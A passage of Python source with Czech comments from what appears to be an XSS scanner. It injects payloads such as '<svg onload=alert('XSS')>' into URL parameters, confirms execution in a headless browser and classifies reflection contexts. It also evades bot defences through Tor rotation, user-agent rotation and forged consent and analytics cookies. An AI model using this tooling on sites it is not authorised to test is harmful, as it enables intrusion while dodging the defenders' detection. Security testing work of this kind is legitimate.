                        "sinks_hit": sinks,
                        "marker":    marker,
                        "source":    "websocket-dynamic",
                    })

                    if triggered:
                        break  # Hit nalezen pro tento WS

            browser.close()

    except Exception as e:
        results.append({
            "error":  f"{type(e).__name__}: {e}",
            "source": "websocket-dynamic",
        })

    return results


# ---------- DOM dynamic (Playwright) ----------
# ══════════════════════════════════════════════════════════════════════
# DOM DYNAMIC VALIDATOR
# ══════════════════════════════════════════════════════════════════════

def _load_dom_hooks_script(marker: str) -> str:
    """
    Načte dom_hooks.js a nahradí placeholder markeru.
    Soubor musí být vedle xss_grenade.py.
    """
    hooks_path = Path(__file__).parent / "dom_hooks.js"
    try:
        template = hooks_path.read_text(encoding="utf-8")
    except Exception:
        # Fallback — inline minimální verze pro případ chybějícího souboru
        return f"""
        window.__xss_detected__ = false;
        window.__dom_sinks__ = [];
        window.__csp_violations__ = [];
        window.__marker__ = {json.dumps(marker)};
        try {{
            var innerDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
            var origInnerHTMLSet = innerDesc.set;
            Object.defineProperty(Element.prototype, 'innerHTML', {{
                set: function(v) {{
                    window.__dom_sinks__.push({{sink:'innerHTML', value: String(v).substring(0,200)}});
                    if (String(v).indexOf(window.__marker__) !== -1) window.__xss_detected__ = true;
                    return origInnerHTMLSet.call(this, v);
                }}
            }});
        }} catch(e) {{}}
        """
    return template.replace("__XSS_MARKER_PLACEHOLDER__", json.dumps(marker))


class DOMValidator:
    """
    Persistentní Playwright browser pro DOM-XSS validaci.

    Použití jako context manager:
        with DOMValidator(verify_ssl=True) as v:
            result = v.validate(url, param, payload)
            result2 = v.validate(url2, param2, payload)

    Browser se spustí jednou a recykluje se pro všechny validace.
    Proti starému per-call přístupu ~5-6× rychlejší.
    """

    def __init__(self, verify_ssl: bool = False, page_timeout_ms: int = 15000):
        self._pw = None
        self._browser = None
        self._context = None
        self._available = False
        self._verify_ssl = verify_ssl
        self._page_timeout_ms = page_timeout_ms
        self._init_error: Optional[str] = None

    def __enter__(self):
        try:
            from playwright.sync_api import sync_playwright
        except Exception as e:
            self._init_error = f"Playwright not available: {e}"
            return self

        try:
            self._pw = sync_playwright().start()
            self._browser = self._pw.chromium.launch(headless=True)
            self._context = self._browser.new_context(
                ignore_https_errors=not self._verify_ssl
            )
            self._context.set_default_timeout(self._page_timeout_ms)
            self._available = True
        except Exception as e:
            self._init_error = f"Browser launch failed: {e}"
            self._cleanup()
        return self

    def __exit__(self, *args):
        self._cleanup()

    def _cleanup(self):
        try:
            if self._context:
                self._context.close()
        except Exception:
            pass
        try:
            if self._browser:
                self._browser.close()
        except Exception:
            pass
        try:
            if self._pw:
                self._pw.stop()
        except Exception:
            pass
        self._context = None
        self._browser = None
        self._pw = None
        self._available = False

    @property
    def available(self) -> bool:
        return self._available

    @property
    def init_error(self) -> Optional[str]:
        return self._init_error

    def validate(self,
                 url: str,
                 param: str,
                 payload: str,
                 wait_secs: float = 2.0) -> Dict:
        """
        Otestuje jeden (url, param, payload) trojici.
        Vrací dict s výsledkem validace (stejný formát jako původní dom_dynamic_validate).
        """
        marker = "__XSS_MARKER__" + random_marker(8)
        inj_url = inject_into_params(url, param, payload.replace("XSS", marker), extra_params=None) or url

        out = {
            "triggered":        False,
            "dialog":           None,
            "dialog_message":   None,
            "saw_marker":       False,
            "error":            None,
            "marker":           marker,
            "test_url":         inj_url,
            "sinks_hit":        [],
            "csp_violations":   [],
        }

        if not self._available:
            out["error"] = self._init_error or "Validator not initialized"
            return out

        page = None
        try:
            page = self._context.new_page()

            def on_dialog(d):
                out["triggered"] = True
                out["dialog"] = d.type
                try:
                    out["dialog_message"] = (d.message or "")[:200]
                except Exception:
                    pass
                try:
                    d.dismiss()
                except Exception:
                    pass

            page.on("dialog", on_dialog)

            # Inject hooks PŘED načtením stránky
            hooks_script = _load_dom_hooks_script(marker)
            page.add_init_script(hooks_script)

            # Navigace s networkidle preferencí — lepší timing pro SPA
            try:
                page.goto(inj_url, wait_until="networkidle", timeout=self._page_timeout_ms)
            except Exception:
                # networkidle timeout = stránka pořád něco fetchuje,
                # ale DOM už je pravděpodobně načtený — pokračuj
                try:
                    page.wait_for_load_state("domcontentloaded", timeout=3000)
                except Exception:
                    pass

            # Grace period pro setTimeout/async handlery
            grace_ms = max(300, int(wait_secs * 1000))
            page.wait_for_timeout(grace_ms)

            # Vyhodnocení
            try:
                content = page.content() or ""
                if marker in content:
                    out["saw_marker"] = True
            except Exception:
                pass

            try:
                if page.evaluate("window.__xss_detected__"):
                    out["triggered"] = True
            except Exception:
                pass

            try:
                sinks = page.evaluate("window.__dom_sinks__") or []
                # Filtruj jen sinky s naším markerem (ostatní jsou šum)
                marker_sinks = [s for s in sinks if isinstance(s, dict) and s.get("value") and marker in s.get("value", "")]
                out["sinks_hit"] = marker_sinks
            except Exception:
                pass

            try:
                violations = page.evaluate("window.__csp_violations__") or []
                out["csp_violations"] = violations
            except Exception:
                pass

        except Exception as e:
            out["error"] = f"{type(e).__name__}: {e}"
        finally:
            if page:
                try:
                    page.close()
                except Exception:
                    pass

        return out

    def validate_multi(self,
                       url: str,
                       param: str,
                       context: str = None,
                       payloads: List[str] = None,
                       max_payloads: int = 3,
                       wait_secs: float = 2.0) -> Dict:
        """
        Pokusí se o DOM validaci s více payloady podle kontextu.

        Pokud `context` je zadaný, vybere 3 nejlepší payloady z context-specific
        banky (SCRIPT, ATTR, URL, COMMENT, STYLE, HTML). Pokud ne, zkusí
        univerzální sadu. Vrací první úspěšný hit (triggered=True), jinak
        poslední pokus (pro reporting).

        Optimalizace: pokud první payload vystřelí, ostatní se neposílají.
        To je klíčové pro rychlost — mnoho cílů se chytí už prvním payloadem.
        """
        # Vyber payloady — buď uživatelem zadané, nebo z context banky
        if payloads is None:
            if context:
                # Přemapuj context → payload bank key
                ctx_key = {
                    "script_body":   "script_body",
                    "script":        "script_body",
                    "html_attr":     "html_attr",
                    "event_handler": "html_attr",
                    "attr":          "html_attr",
                    "href_attr":     "href_attr",
                    "url":           "href_attr",
                    "html_comment":  "html_comment",
                    "comment":       "html_comment",
                    "style":         "style",
                    "html_body":     "html_body",
                    "html":          "html_body",
                }.get(context, "html_body")
                bank = get_context_payloads(ctx_key)
            else:
                # Univerzální sada — 3 payloady pokrývající nejčastější kontexty
                bank = [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "\"><script>alert('XSS')</script>",
                ]

            # Vezmi prvních N payloadů — kontextové banky jsou seřazené podle
            # účinnosti (nejlepší jako první).
            payloads = bank[:max_payloads]

        # Iterativně zkoušej, první trigger vyhraje
        last_result = None
        for p in payloads:
            if not self._available:
                return {"error": self._init_error, "triggered": False}
            result = self.validate(url, param, p, wait_secs=wait_secs)
            last_result = result
            # Pokud se XSS spustil (dialog nebo marker viděn), vracíme hit
            if result.get("triggered") or result.get("saw_marker"):
                result["payload_used"] = p
                result["payloads_tried"] = payloads[:payloads.index(p) + 1]
                return result
            # Pokud máme CSP violations, taky je to silný signál — uložit,
            # ale pokračovat na další payload (možná CSP je bypassable)

        # Žádný payload nespustil XSS — vrať poslední result + info
        if last_result is None:
            return {"triggered": False, "error": "no payloads tried"}
        last_result["payload_used"] = payloads[-1] if payloads else None
        last_result["payloads_tried"] = payloads
        return last_result


def dom_dynamic_validate(url: str,
                         param: str,
                         payload: str,
                         wait_secs: float = 2.0) -> Dict[str, str]:
    """
    Zpětně kompatibilní wrapper — spustí jeden validator pro jeden request.
    Pro bulk validaci použij DOMValidator jako context manager přímo.
    """
    with DOMValidator() as validator:
        return validator.validate(url, param, payload, wait_secs=wait_secs)


# ---------- Task generation ----------
def generate_tasks(param_urls: List[str], payloads: List[str], marker_enabled: bool, marker_param: str) -> List[Tuple[str, str, str, str]]:
    tasks: List[Tuple[str, str, str, str]] = []
    for url in param_urls:
        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
        if not qs:
            continue
        for param in qs.keys():
            for payload in payloads:
                marker = random_marker(12) if marker_enabled else ""
                tasks.append((url, param, payload, marker))
    return tasks
 
# ---------- Worker ----------
_REQUEST_FAILED = "__REQUEST_FAILED__"  # sentinel pro circuit breaker

# Globální counter pro periodickou Tor rotaci
_TOR_REQUEST_COUNTER = 0
_TOR_COUNTER_LOCK = Lock()

# ─── v10.14: Adaptivní per-host throttling ──────────────────────────────────
# Když server vrací 429/503, scanner zpomalí JEN pro tento host —
# nezávisle pro různé cíle. Backoff je exponenciální (1s → 2s → 4s → ...)
# s maximem 60s, reset při úspěšném 2xx requestu.
#
# State per host:
#   {host: {"backoff": seconds_to_wait_before_next, "until": timestamp,
#           "consecutive_blocks": int}}
#
# Aktivuje se opt-in přes session._adaptive_throttle = True. Bez tohoto
# atributu má perform_request stejné chování jako dřív (backwards compat).
_HOST_THROTTLE_STATE: Dict[str, dict] = {}
_THROTTLE_LOCK = Lock()
# Hard cap — i kdyby server posílal Retry-After: 3600, scanner nečeká
# víc než minutu (jinak by scan zamrzl).
_THROTTLE_MAX_BACKOFF_SEC = 60.0
# Status codes triggering throttle. 429 = explicit rate limit. 503 =
# server overload (často signál bot detection). 403/406 nezahrnujeme —
# můžou znamenat permanent block, tam throttle nepomůže.
_THROTTLE_TRIGGER_CODES = {429, 503}


def _apply_host_throttle(url: str) -> None:
    """Pokud je host throttlován (nedávno dostal 429/503), počká před
    pokračováním. Bezpečné v multi-threaded prostředí (state je pod lockem).
    """
    try:
        host = urlparse(url).netloc.lower()
    except Exception:
        return
    if not host:
        return

    with _THROTTLE_LOCK:
        state = _HOST_THROTTLE_STATE.get(host)
        if not state:
            return
        wait_until = state.get("until", 0.0)
        now = time.time()
        wait_for = wait_until - now

    if wait_for > 0:
        # Capped sleep — bezpečné i kdyby server poslal Retry-After: 86400
        time.sleep(min(wait_for, _THROTTLE_MAX_BACKOFF_SEC))


def _record_host_response(url: str,
                            status_code: int,
                            retry_after: Optional[str] = None) -> None:
    """Aktualizuje throttle state podle response status. 429/503 trigger
    exponenciální backoff; 2xx response resetuje stav pro host.

    Retry-After hlavička (pokud přítomna) má prioritu před exponenciálním
    backoffem — server explicitně řekl, kolik čekat, respektujeme to
    (ale capped na _THROTTLE_MAX_BACKOFF_SEC).
    """
    try:
        host = urlparse(url).netloc.lower()
    except Exception:
        return
    if not host:
        return

    is_block = status_code in _THROTTLE_TRIGGER_CODES
    is_success = 200 <= status_code < 300

    with _THROTTLE_LOCK:
        state = _HOST_THROTTLE_STATE.get(host)

        if is_success:
            # Úspěch → reset stavu pro tento host
            if state:
                _HOST_THROTTLE_STATE.pop(host, None)
            return

        if not is_block:
            # Jiný status (3xx, 4xx kromě 429, 5xx kromě 503) →
            # nedotýkáme se stavu
            return

        # 429 nebo 503 → exponenciální backoff
        if state is None:
            state = {"consecutive_blocks": 0, "backoff": 1.0, "until": 0.0}

        state["consecutive_blocks"] = int(state.get("consecutive_blocks", 0)) + 1
        # Exponenciální: 1 → 2 → 4 → 8 → ... capped
        new_backoff = min(state.get("backoff", 1.0) * 2,
                          _THROTTLE_MAX_BACKOFF_SEC)
        state["backoff"] = max(new_backoff, 1.0)

        # Retry-After parsing — má prioritu před exponenciálním
        ra_seconds = None
        if retry_after:
            try:
                # Retry-After může být buď číslo (seconds) nebo HTTP-date
                ra_seconds = float(retry_after.strip())
            except (ValueError, AttributeError):
                # HTTP-date format — pokus o parsování
                try:
                    from email.utils import parsedate_to_datetime
                    dt = parsedate_to_datetime(retry_after)
                    ra_seconds = max(0.0, (dt.timestamp() - time.time()))
                except Exception:
                    ra_seconds = None

        if ra_seconds is not None and ra_seconds > 0:
            # Respektuj Retry-After (capped)
            wait_for = min(ra_seconds, _THROTTLE_MAX_BACKOFF_SEC)
        else:
            wait_for = state["backoff"]

        state["until"] = time.time() + wait_for
        _HOST_THROTTLE_STATE[host] = state

        logging.info(
            f"[throttle] {host} returned {status_code} "
            f"(block #{state['consecutive_blocks']}) — "
            f"backing off {wait_for:.1f}s")


# v10.14: Origin probe / warm-up sequence — předtím než scanner začne
# útok, simuluje realistickou návštěvu stránky (browser-like):
#   1. GET /robots.txt  (50% browserů to kontroluje)
#   2. GET /favicon.ico (každý browser to fetchne automaticky)
#   3. GET /  (homepage — pre-establish session cookies)
# Toto:
#   - Vytvoří cookie jar s realistickými cookies (analytics, session)
#   - Server vidí "browser-like" patterns než dostane útok
#   - Bot detection systémy fingerprintují počáteční sekvenci requestů
#
# Chyby ignorujeme — warm-up je best-effort, scan musí pokračovat i když
# robots.txt vrátí 404 atd. Timeout je nižší než main timeout (snižuje
# pomalost při fail).
def _perform_warmup_sequence(session, target_url: str,
                               timeout: float = 4.0,
                               on_log=None,
                               prepopulate_cookies: bool = True) -> None:
    """Realistický browser-like přístup k cíli před prvním útokem.

    Tichá funkce — chyby jen logujeme, scan pokračuje i kdyby všechno
    selhalo. Důležité je, že server vidí browser-like pattern requestů
    před útokem.

    v10.14: prepopulate_cookies (default True) — vloží do session cookie
    jar generická "prior-visit" cookies (GDPR consent, analytics opt-in
    apod.) PŘED první request. To simuluje opakovaného návštěvníka,
    což u některých bot detection systémů (Cloudflare Bot Management)
    vede k vyššímu trust score než first-time visitor.

    Args:
        session: requests / curl_cffi session (musí mít .get())
        target_url: URL cíle pro extraktování origin
        timeout: timeout v sekundách pro každý warm-up request
        on_log: volitelný callback pro logging
        prepopulate_cookies: vložit generic "prior visit" cookies
    """
    try:
        parsed = urlparse(target_url)
    except Exception:
        return
    if not parsed.scheme or not parsed.netloc:
        return
    origin = f"{parsed.scheme}://{parsed.netloc}"
    domain = parsed.hostname or ""

    # v10.14: pre-populate cookies s realistic GDPR/analytics tokens.
    # Tyto cookie name patterns jsou všudypřítomné v EU (GDPR consent
    # banners) a celosvětově (Google Analytics _ga). Server vidí
    # klienta s "prior visit" state, ne first-time visitor.
    if prepopulate_cookies and domain:
        try:
            # GDPR consent (Cookiebot/OneTrust pattern)
            session.cookies.set(
                "CookieConsent",
                "{stamp:'sha256-XSS_ABCDEF',necessary:true,preferences:true,statistics:true,marketing:false,method:'explicit'}",
                domain=domain, path="/",
            )
            # Google Analytics _ga — věrohodný formát (GAxx.x.timestamp.random)
            ga_ts = int(time.time()) - random.randint(86400, 86400 * 30)  # 1-30 dní starý
            ga_random = random.randint(100000000, 999999999)
            session.cookies.set(
                "_ga", f"GA1.2.{ga_random}.{ga_ts}",
                domain=domain, path="/",
            )
            # _gid (24h session) — recent
            session.cookies.set(
                "_gid", f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
                domain=domain, path="/",
            )
        except Exception:
            # Tichý fail — některé cookie jar implementations odmítnou
            # set() bez správného formátu, není kritické
            pass

    # Sekvence v pořadí jakou by browser provedl
    warmup_paths = [
        # Browser často kontroluje robots.txt jako první (pro indexing)
        "/robots.txt",
        # Každý browser automaticky fetchuje favicon
        "/favicon.ico",
        # Homepage — pre-establish session cookies, fingerprint baseline
        "/",
    ]

    success_count = 0
    for path in warmup_paths:
        url = origin + path
        try:
            # Headers se nastaví v perform_request přes session._ua_rotator
            # Tady přidáme jen Referer pro homepage (přirozenější).
            extra_headers = {}
            if path == "/":
                # Browser typicky přijde na homepage z Google/přímé navigace
                # — žádný Referer = direct navigation (přirozené)
                pass
            elif path == "/favicon.ico":
                # Favicon je triggered z homepage → Referer = homepage
                extra_headers["Referer"] = origin + "/"

            r = session.get(url, timeout=timeout,
                            allow_redirects=True,
                            headers=extra_headers if extra_headers else None)
            if r.status_code < 500:
                success_count += 1
        except Exception:
            # Tichý fail — warm-up je best-effort
            continue

    if on_log:
        try:
            on_log(
                f"[warm-up] origin probe complete: "
                f"{success_count}/{len(warmup_paths)} responses",
                "info",
            )
        except Exception:
            pass


def perform_request(session, test_url: str, timeout: float, follow_redirects: bool):
    """
    Wrapper kolem session.get() s:
      - Per-target sticky UA (next_headers_for(url)) místo globální rotace
      - Periodická Tor circuit rotation (každých N requestů)
      - A/B test record per UA (success/blocked tracking)
      - Behavioral timing — opt-in přes session._scan_intensity
      - v10.14: Adaptive per-host throttling při 429/503 (opt-in přes
        session._adaptive_throttle = True). Sleduje rate-limit signály
        per host, aplikuje exponenciální backoff jen pro daný host.
    """
    global _TOR_REQUEST_COUNTER

    # v10.14: Adaptive throttling — počkej před requestem pokud server
    # rate-limituje daný host. Aktivuje se jen pokud session má atribut
    # _adaptive_throttle = True (opt-in, backwards compat).
    if getattr(session, "_adaptive_throttle", False):
        _apply_host_throttle(test_url)

    # ── Behavioral timing (#7) — opt-in přes session._scan_intensity ──
    scan_intensity = getattr(session, "_scan_intensity", None)
    if scan_intensity:
        try:
            # v10.14: pass host URL pro RTT-aware scaling — pokud
            # server je pomalý, delay roste proporcionálně
            time.sleep(realistic_request_delay(scan_intensity,
                                                host_url=test_url))
        except Exception:
            pass

    # ── Per-target UA refresh (#4 — sticky per hostname) ──
    ua_rot = getattr(session, "_ua_rotator", None)
    current_ua_for_record: Optional[str] = None
    if ua_rot is not None:
        try:
            # Per-target preferenční (lepší pro multi-target scan)
            headers = ua_rot.next_headers_for(test_url)
            session.headers.update(headers)
            current_ua_for_record = headers.get("User-Agent")
        except Exception:
            pass

    # ── Periodická Tor rotation ──
    tc = get_tor_controller()
    if tc is not None and tc.enabled:
        tor_rotate_every = getattr(session, "_tor_rotate_every", 0)
        if tor_rotate_every and tor_rotate_every > 0:
            with _TOR_COUNTER_LOCK:
                _TOR_REQUEST_COUNTER += 1
                should_rotate = (_TOR_REQUEST_COUNTER % tor_rotate_every == 0)
            if should_rotate:
                tc.rotate()
                # Force UA + cookie reset při rotaci Tor identity
                if ua_rot is not None:
                    ua_rot.force_rotate(session=session)

    try:
        r = session.get(test_url, timeout=timeout, allow_redirects=follow_redirects)
        # ── A/B record (#8) ──
        if ua_rot is not None and current_ua_for_record:
            try:
                ua_rot.record_response(current_ua_for_record, r.status_code)
            except Exception:
                pass
        # v10.14: Adaptive throttling — zaznamenat status code
        if getattr(session, "_adaptive_throttle", False):
            _record_host_response(test_url, r.status_code,
                                   retry_after=r.headers.get("Retry-After"))
        # v10.14: RTT tracking — zaznamenat response time per host.
        # Pomáhá scanneru přizpůsobit delay rychlosti serveru
        # (browser-like adaptation).
        try:
            if hasattr(r, "elapsed") and r.elapsed is not None:
                _record_host_rtt(test_url, r.elapsed.total_seconds())
        except Exception:
            pass
        return r
    except _NET_EXCEPTIONS:
        # Failed request = záporné pro A/B (counted jako sent + blocked)
        if ua_rot is not None and current_ua_for_record:
            try:
                ua_rot.record_response(current_ua_for_record, 0, blocked=True)
            except Exception:
                pass
        return _REQUEST_FAILED  # type: ignore
 
def body_contains_reflection(body: str, payload: str, marker: str = None) -> bool:
    """
    Rychlá binární kontrola — je vůbec něco reflektováno?
    Volej jako první, před klasifikací kontextu.
    Vrací True/False — žádná klasifikace, jen přítomnost.

    Pokrývá:
    - Marker (nejsilnější signál — je nedotčený random string)
    - Přesný payload
    - HTML-escaped payload (&lt;svg&gt;)
    - URL-encoded payload
    - Partial encoding (jen < escaped ale > ne, nebo naopak)
    - Case-insensitive match (server může HTML normalizovat)
    - Whitespace changes (mezera → + / tab / nbsp)
    """
    if not body:
        return False
    if marker and marker in body:
        return True
    if payload in body:
        return True
    if escape(payload) in body:
        return True
    if re.search(re.escape(requests.utils.requote_uri(payload)), body):
        return True
    # Partial encoding — jen < escaped, > netknuté (běžný polovičatý sanitizer)
    partial_lt = payload.replace("<", "&lt;")
    if partial_lt != payload and partial_lt in body:
        return True
    partial_gt = payload.replace(">", "&gt;")
    if partial_gt != payload and partial_gt in body:
        return True
    # Case-insensitive match (server HTML normalizoval)
    if payload.lower()[:20] in body.lower():
        return True
    # Whitespace normalization — mezery převedeny na + (URL) nebo tab
    ws_norm_payload = re.sub(r'\s+', ' ', payload).strip()
    ws_norm_body = re.sub(r'[\s+\t]+', ' ', body)
    if ws_norm_payload and len(ws_norm_payload) >= 8 and ws_norm_payload in ws_norm_body:
        return True
    return False


def detect_reflection(body: str, payload: str, marker: str = None) -> Dict[str, any]:
    """
    Detailní detekce reflexe — vrátí dict s různými úrovněmi.
    Použij pro diagnostiku a lepší reportování.

    Vrací:
        {
            "reflected": bool,         # nějaká úroveň reflexe nalezena
            "kind": str | None,        # "exact" | "html_escaped" | "url_encoded" |
                                       # "partial_lt" | "partial_gt" |
                                       # "case_changed" | "whitespace_changed" |
                                       # "marker_only" | None
            "position": int,           # offset v body (-1 pokud nenalezeno)
            "marker_found": bool,      # zda marker prošel nedotčen
            "sanitization_note": str,  # lidsky čitelná poznámka
        }
    """
    result = {
        "reflected": False,
        "kind": None,
        "position": -1,
        "marker_found": False,
        "sanitization_note": "",
    }
    if not body:
        return result

    # 1. Marker match — nejsilnější signál
    if marker and marker in body:
        result["marker_found"] = True
        result["reflected"] = True
        result["position"] = body.find(marker)
        # Marker prošel — teď zjisti jak dopadl payload
        if payload in body:
            result["kind"] = "exact"
            result["sanitization_note"] = "Payload passed through without sanitization"
        elif escape(payload) in body:
            result["kind"] = "html_escaped"
            result["sanitization_note"] = "Payload is HTML-escaped (probably safe)"
        else:
            result["kind"] = "marker_only"
            result["sanitization_note"] = "Marker passed through, but the payload was sanitized"
        return result

    # 2. Přesný payload
    if payload in body:
        result["reflected"] = True
        result["kind"] = "exact"
        result["position"] = body.find(payload)
        result["sanitization_note"] = "Exact reflection without sanitization"
        return result

    # 3. HTML entity encoding
    esc = escape(payload)
    if esc != payload and esc in body:
        result["reflected"] = True
        result["kind"] = "html_escaped"
        result["position"] = body.find(esc)
        result["sanitization_note"] = "Fully HTML-escaped (safe)"
        return result

    # 4. URL encoding
    url_enc = requests.utils.requote_uri(payload)
    if url_enc != payload and url_enc in body:
        result["reflected"] = True
        result["kind"] = "url_encoded"
        result["position"] = body.find(url_enc)
        result["sanitization_note"] = "URL-encoded (evaluate the context — may be exploitable)"
        return result

    # 5. Partial encoding — jen < escaped, > netknuté
    partial_lt = payload.replace("<", "&lt;")
    if partial_lt != payload and partial_lt in body:
        result["reflected"] = True
        result["kind"] = "partial_lt"
        result["position"] = body.find(partial_lt)
        result["sanitization_note"] = "Partial sanitization (< escaped, > untouched) — probably exploitable"
        return result

    partial_gt = payload.replace(">", "&gt;")
    if partial_gt != payload and partial_gt in body:
        result["reflected"] = True
        result["kind"] = "partial_gt"
        result["position"] = body.find(partial_gt)
        result["sanitization_note"] = "Partial sanitization (> escaped, < untouched) — may be exploitable"
        return result

    # 6. Case change
    if payload.lower()[:20] in body.lower() and payload[:20] not in body:
        result["reflected"] = True
        result["kind"] = "case_changed"
        result["position"] = body.lower().find(payload.lower()[:20])
        result["sanitization_note"] = "Case was changed — the server normalized the HTML (typically safe for tags)"
        return result

    # 7. Whitespace normalization
    ws_norm_payload = re.sub(r'\s+', ' ', payload).strip()
    if ws_norm_payload and len(ws_norm_payload) >= 8:
        ws_norm_body = re.sub(r'[\s+\t]+', ' ', body)
        if ws_norm_payload in ws_norm_body and payload not in body:
            result["reflected"] = True
            result["kind"] = "whitespace_changed"
            result["position"] = ws_norm_body.find(ws_norm_payload)
            result["sanitization_note"] = "Whitespace changed (spaces → +/tab) — likely a URL-decode artifact, exploitable"
            return result

    return result

 
 
def _payload_breakout_chars(payload: str) -> Set[str]:
    """
    Vrátí set znaků, které musí projít nezměněné aby payload byl spustitelný.
    Pro <script>alert(1)</script> jsou to {'<', '>', '/'}.
    Pro " onerror=alert(1) jsou to {'"', '='}.
    """
    chars = set()
    for c in payload:
        if c in '<>"\'`/=':
            chars.add(c)
    return chars


def _check_payload_executable(body: str, payload: str, marker_pos: int,
                               window: int = 200) -> Tuple[bool, str]:
    """
    Po nalezení reflexe (marker_pos) zkontroluje, zda payload skutečně
    prošel jako spustitelný kód, nebo byl sanitizován.

    Returns:
        (is_executable: bool, reason: str)

    Pravidla:
    - Pokud payload obsahoval `<` a `>` ale v okolí markeru jsou všechny
      `<` přítomné jako `&lt;`, payload byl HTML-escaped → not executable
    - Pokud payload obsahoval `"` ale v okolí jsou všechny `"` přítomné
      jako `\\"` (JS escaped) nebo `&quot;`, payload byl escaped → not executable
    - Pokud aspoň některý ze breakout znaků je přítomen RAW v okolí markeru,
      payload mohl uniknout
    """
    if marker_pos < 0:
        return False, "no marker position"

    breakouts = _payload_breakout_chars(payload)
    if not breakouts:
        return False, "no breakout chars in payload"

    # Vezmi okolí markeru pro analýzu — ±window znaků
    start = max(0, marker_pos - window)
    end = min(len(body), marker_pos + window)
    context_window = body[start:end]

    # Mapování raw → escaped form
    raw_to_escaped = {
        '<': ['&lt;', '&LT;', '&#60;', '&#x3c;', '&#x3C;'],
        '>': ['&gt;', '&GT;', '&#62;', '&#x3e;', '&#x3E;'],
        '"': ['&quot;', '&QUOT;', '&#34;', '&#x22;', '\\"'],
        "'": ['&#39;', '&#x27;', '&apos;', "\\'"],
        '/': ['&#47;', '&#x2f;', '&#x2F;'],
        '=': ['&#61;', '&#x3d;', '&#x3D;'],
    }

    raw_present = []  # Breakout znaky, které jsou v okolí markeru jako raw
    escaped_only = []  # Breakout znaky, které jsou jen escaped

    for ch in breakouts:
        # Kolikrát je raw znak v okolí?
        raw_count = context_window.count(ch)
        # Kolikrát je escaped verze v okolí?
        escaped_count = sum(context_window.count(esc)
                           for esc in raw_to_escaped.get(ch, []))

        if raw_count > 0:
            raw_present.append(ch)
        elif escaped_count > 0:
            escaped_only.append(ch)

    # Heuristika: pokud > 50% breakout znaků je RAW (nepřeloženo), payload má šanci se spustit.
    # Pokud > 50% je jen escaped, payload byl sanitizován.
    if not breakouts:
        return False, "no breakouts"

    raw_ratio = len(raw_present) / len(breakouts)

    if raw_ratio >= 0.5:
        return True, f"raw breakouts present: {raw_present}"
    else:
        return False, f"breakouts escaped: raw={raw_present} escaped_only={escaped_only}"


def _classify_reflection_context_legacy(body: str, payload: str, marker: str = None) -> Optional[str]:
    """
    LEGACY regex-based classifier — používá se jako fallback, když context_engine
    modul není dostupný nebo selže při běhu. Nový wrapper classify_reflection_context
    (definovaný níže) deleguje na Context Engine, když je dostupný.

    Kontextová klasifikace reflexe — kde v DOM se payload objevil?
    Volej až PO body_contains_reflection() == True.

    KLÍČOVÉ VYLEPŠENÍ:
    - Pokud breakout znaky payloadu jsou v okolí markeru jen jako entity
      (&lt; &gt; &quot;), klasifikuj jako html_escaped (false positive)
    - Pokud aspoň některé breakouty jsou raw (uniknul sanitizaci), pokračuj
      s detekcí kontextu

    Vrací:
        "script_body"   → payload uvnitř <script>…</script>         KRITICKÝ
        "event_handler" → payload v on* atributu                    KRITICKÝ
        "href_attr"     → payload v href/src/action/data atributu   ZÁVAŽNÝ
        "html_attr"     → payload v jiném HTML atributu             STŘEDNÍ
        "html_escaped"  → payload je HTML-escapován                 FALSE POSITIVE
        "js_string"     → payload uvnitř JS stringu (escaped)       FALSE POSITIVE
        "html_comment"  → payload je v HTML komentáři               FALSE POSITIVE
        "html_body"     → payload v těle stránky, bez tagu          STŘEDNÍ
        None            → reflexe nebyla nalezena
    """
    # Pokus 1: Najdi marker v body (nejsilnější signál)
    idx = -1
    if marker:
        idx = body.find(marker)

    # Pokus 2: Pokud marker není v body (server neodráží marker param),
    # hledej raw payload.
    # REGRESSION (example.org): scanner posílal ?q=PAYLOAD&_=MARKER, ale server
    # reflektoval jen q= (ne _=). Původně funkce vrátila None, protože
    # hledala jen marker. Nyní má payload fallback.
    if idx == -1:
        idx = body.find(payload)

    if idx == -1:
        # Ani marker, ani raw payload v body.
        # Poslední pokus: escaped varianta payloadu.
        esc_payload = escape(payload)
        if esc_payload != payload and esc_payload in body:
            return "html_escaped"
        return None

    # ── 1. Breakout analýza ───────────────────────────────────────────────────
    # Pokud payload obsahuje breakout znaky (<, >, ", ') ale ty jsou v okolí
    # markeru jen jako HTML entity, payload nemůže uniknout → false positive.
    is_executable, reason = _check_payload_executable(body, payload, idx, window=200)
    if not is_executable and _payload_breakout_chars(payload):
        # Payload obsahoval breakouts ale všechny byly sanitizované
        logging.debug(f"[FP-DETECT] payload not executable: {reason}")
        return "html_escaped"

    # ── 2. HTML komentář → pravděpodobně false positive ───────────────────────
    # POZOR (v10.19, icanteen TP): NEklasifikuj jako html_comment, když je
    # marker uvnitř <script> bloku. Starý JSP/PHP vzorec obaluje JS do
    # <script><!-- ... // --></script>; ten <!-- --> je pro JS parser
    # NEVIDITELNÝ — kód uvnitř se VYKONÁ. Když tu vrátíme html_comment,
    # minuli bychom reálný script-context XSS (breakout z JS stringu).
    _marker_in_script = False
    for _m in re.finditer(r"<script(?:\s[^>]*)?>", body, re.I):
        _so = _m.end()
        _sc_match = re.search(r"</script\s*>", body[_so:], re.I)
        _sc = _so + _sc_match.start() if _sc_match else len(body)
        if _so <= idx < _sc:
            _marker_in_script = True
            break
    if not _marker_in_script:
        before = body[max(0, idx - 200):idx]
        after  = body[idx:idx + 200]
        if "<!--" in before and "-->" in after:
            segment = before[before.rfind("<!--"):]
            if "<" not in segment.replace("<!--", ""):
                return "html_comment"

    # ── 3. Script body → KRITICKÝ ─────────────────────────────────────────────
    # Mapujeme všechny otevírací a zavírací <script> tagy a zjišťujeme
    # zda needle leží uvnitř některého páru.
    script_open  = [m.end()   for m in re.finditer(r"<script(?:\s[^>]*)?>", body, re.I)]
    script_close = [m.start() for m in re.finditer(r"</script\s*>", body, re.I)]
    in_script = False
    script_start_pos = -1
    for open_pos in script_open:
        valid_closes = [c for c in script_close if c > open_pos]
        end_pos = valid_closes[0] if valid_closes else len(body)
        if open_pos <= idx < end_pos:
            in_script = True
            script_start_pos = open_pos
            break

    if in_script:
        # KLÍČOVÝ DODATEK: rozliš mezi "payload v JS stringu" (FP)
        # a "payload jako JS kód" (TP).
        # Pokud marker je v JS stringu obklopeném " nebo ', musíme ověřit,
